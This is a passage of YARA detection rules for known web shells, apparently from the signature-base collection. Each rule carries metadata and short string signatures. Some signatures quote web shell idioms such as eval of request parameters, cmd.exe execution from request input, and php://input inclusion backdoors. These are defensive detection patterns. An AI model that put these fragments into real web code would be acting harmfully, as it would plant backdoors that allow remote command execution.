		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L784-L797"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "babfa76d11943a22484b3837f105fada"
		logic_hash = "365d19c086b3bbb98cbe1e1ed1e7522ce98dc2614a39c747717c277cebef33d2"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jspshell {
    meta:
		description = "Web Shell - file jspShell.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L798-L812"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0d5b5a17552254be6c1c8f1eb3a5fdc1"
		logic_hash = "058ddd64b142cada7144b9befa81ada314b72e6f23524d98efcb10136c23ed33"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on"
		$s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Dx_Dx {
    meta:
		description = "Web Shell - file Dx.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L813-L827"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
		logic_hash = "c2eddf58b25caff79460ab9a87ac0573d483866a87c1b1ec0984afce2c22b29f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s9 = "class=linelisting><nobr>POST (php eval)</td><"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Asp_Ntdaddy {
    meta:
		description = "Web Shell - file ntdaddy.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L828-L842"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c5e6baa5d140f73b4e16a6cfde671c68"
		logic_hash = "7237eb7233c6affcc1f67a764f704b7d7e1d13f71c64893286c6c99318cc7c3e"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "if  FP  =  \"RefreshFolder\"  or  "
		$s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  "

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Mysql_Web_Interface_Version_0_8 {
    meta:
		description = "Web Shell - file MySQL Web Interface Version 0.8.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L843-L856"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
		logic_hash = "680d4368804ad21e46dbe400563beca3ef724711b5432dccce1276ecadc04f2c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Elmaliseker_2 {
    meta:
		description = "Web Shell - file elmaliseker.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L857-L871"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
		logic_hash = "ca300cd142b3c8b820d3b5f5a56eeb834d9acb1d85916b932bd67fb4a25f4ed0"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx"
		$s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_ASP_Remexp {
    meta:
		description = "Web Shell - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L872-L886"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
		logic_hash = "7a3b35c4a16f26167180cea81f67de101edabb9b35479f7e5acae7f3fe07f304"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques"
		$s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_List1 {
    meta:
		description = "Web Shell - file list1.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L887-L901"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8d9e5afa77303c9c01ff34ea4e7f6ca6"
		logic_hash = "61ecafe477d98c5eb6887a9ff50960fc28b84512d09a36c02588159b08b395a4"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive"
		$s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\""

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Phpkit_1_0_Odd {
    meta:
		description = "Web Shell - file odd.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L902-L917"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "594d1b1311bbef38a0eb3d6cbb1ab538"
		logic_hash = "bf99d6a71b9ef72574d928a09f3a479f2f819287d78c9a5435e45752e76a59bf"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "include('php://input');" fullword
		$s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
		$s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_123 {
    meta:
		description = "Web Shell - file 123.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L918-L933"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c691f53e849676cac68a38d692467641"
		logic_hash = "48925d3a302bf09ecb3f031301ca8afc722c7ef53b87efa27a3c4b58ee15217d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7"
		$s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
		$s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_1 {
    meta:
		description = "Web Shell - file 1.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L934-L948"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8991148adf5de3b8322ec5d78cb01bdb"
		logic_hash = "9cae40c8fc3966942a8fc3ee0f5d07081ba2d1c1c3156144488ba64015d6838b"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "!22222222222222222222222222222222222222222222222222" fullword
		$s8 = "<%eval request(\"pass\")%>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_ASP_Tool {
    meta:
		description = "Web Shell - file tool.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L949-L964"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4ab68d38527d5834e9c1ff64407b34fb"
		logic_hash = "62ba39bac09cb403a47678cd38c519642cc3c20f43c470b828ec448c42e9bb73"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\""
		$s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" "
		$s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Cmd_Win32 {
    meta:
		description = "Web Shell - file cmd_win32.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L965-L979"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cc4d4d6cc9a25984aa9a7583c7def174"
		logic_hash = "b90ba15b7b2c557f7b2303695b7f1f737f63df06d712c89e0cfea51c7d37e21d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam"
		$s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Jshell {
    meta:
		description = "Web Shell - file jshell.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L980-L997"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "124b22f38aaaf064cef14711b2602c06"
		logic_hash = "dfe3ac097de4ca406ab7ec967fdc03d1e87c74f84fc675b58438a842d80cccda"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "kXpeW[\"" fullword
		$s4 = "[7b:g0W@W<" fullword
		$s5 = "b:gHr,g<" fullword
		$s8 = "RhV0W@W<" fullword
		$s9 = "S_MR(u7b" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_ASP_Zehir4 {
    meta:
		description = "Web Shell - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L998-L1011"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7f4e12e159360743ec016273c3b9108c"
		logic_hash = "aa3e07ee6369dd5f86f28a53c8e45391de718d4935021339a7b47829b5196f54"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Wsb_Idc {
    meta:
		description = "Web Shell - file idc.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1012-L1026"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7c5b1b30196c51f1accbffb80296395f"
		logic_hash = "f274061f1a02ab65bc574a6586343f74262a463c5200cd2c231a752f54967404"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
		$s3 = "{eval($_GET['idc']);}" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Cpg_143_Incl_Xpl {
    meta:
		description = "Web Shell - file cpg_143_incl_xpl.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1027-L1041"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5937b131b67d8e0afdbd589251a5e176"
		logic_hash = "7c2ce25c33e167761d72331d7c4d4f7cd6029ee0caf6e2008df8b12894faaaf8"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA"
		$s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Mumaasp_Com {
    meta:
		description = "Web Shell - file mumaasp.com.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1042-L1055"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cce32b2e18f5357c85b6d20f564ebd5d"
		logic_hash = "75e2a056782190e9914264b9e34002faea75a35ab0f97bf1e05dec15432d064c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_404 {
    meta:
		description = "Web Shell - file 404.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1056-L1069"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ced050df5ca42064056a7ad610a191b3"
		logic_hash = "3fc928e6edda8fdc4220f57215db61b7fbf8de5b00423b219a173c8ecde40b79"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$pass = md5(md5(md5($pass)));" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Webshell_Cnseay_X {
    meta:
		description = "Web Shell - file webshell-cnseay-x.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1070-L1083"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a0f9f7f5cd405a514a7f3be329f380e5"
		logic_hash = "59cb8b8a5873b716a25096c7b12f09293a812b63f31fea07d919b9c4d2bc9a19"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_Up {
    meta:
		description = "Web Shell - file up.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1084-L1098"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f775e721cfe85019fe41c34f47c0d67c"
		logic_hash = "dff2896d2226ade08e74147121a0e0036e8545dfff36b48b5a0771c9c7d537e9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio"
		$s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Phpkit_0_1A_Odd {
    meta:
		description = "Web Shell - file odd.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1099-L1115"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3c30399e7480c09276f412271f60ed01"
		logic_hash = "745734658ed4000e1399531ae44125f8462ecd37388e6223cfa9bf91dbb52bbc"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "include('php://input');" fullword
		$s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
		$s4 = "// uses include('php://input') to execute arbritary code" fullword
		$s5 = "// php://input based backdoor" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_PHP_Shell_X3 {
    meta:
		description = "Web Shell - file PHP Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1130-L1145"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
		logic_hash = "7361a7eecf345b9c1809294b6b081db8769805ec3e6c656adc4ac87261193683"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
		$s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
		$s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset("

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_PHP_G00Nv13 {
    meta:
		description = "Web Shell - file g00nv13.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1146-L1160"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "35ad2533192fe8a1a76c3276140db820"
		logic_hash = "dd9f03a7ad0d2b73f7a8602ab267e0e8e5cb1f9250f9a25c86ded3797df2f8d5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas"
		$s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_H6Ss {
    meta:
		description = "Web Shell - file h6ss.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1161-L1174"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "272dde9a4a7265d6c139287560328cd5"
		logic_hash = "c4001be111ff271335dd65c15c59da979a8e202bcf58a7f10de7f03644472153"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php eval(gzuncompress(base64_decode(\""

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Zx {
    meta:
		description = "Web Shell - file zx.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1175-L1188"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "67627c264db1e54a4720bd6a64721674"
		logic_hash = "d97df624801d0f24141dfe7074d290a56e639af7d867c907362ff4434c3eeac0"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.g"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Ani_Shell {
    meta:
		description = "Web Shell - file Ani-Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1189-L1204"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "889bfc9fbb8ee7832044fc575324d01a"
		logic_hash = "c8caf8686c36a41b5aae093e88b8872350cf625c59a14389c5df93f284c8f05a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$Python_CODE = \"I"
		$s6 = "$passwordPrompt = \"\\n================================================="
		$s7 = "fputs ($sockfd ,\"\\n==============================================="

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Jsp_K8Cmd {
    meta:
		description = "Web Shell - file k8cmd.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1205-L1218"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b39544415e692a567455ff033a97a682"
		logic_hash = "e523a5b1118c6f4d5798f130c00466c7945d27a6fbe0d4cb3a40b7f36da2a502"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Cmd {
    meta:
		description = "Web Shell - file cmd.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
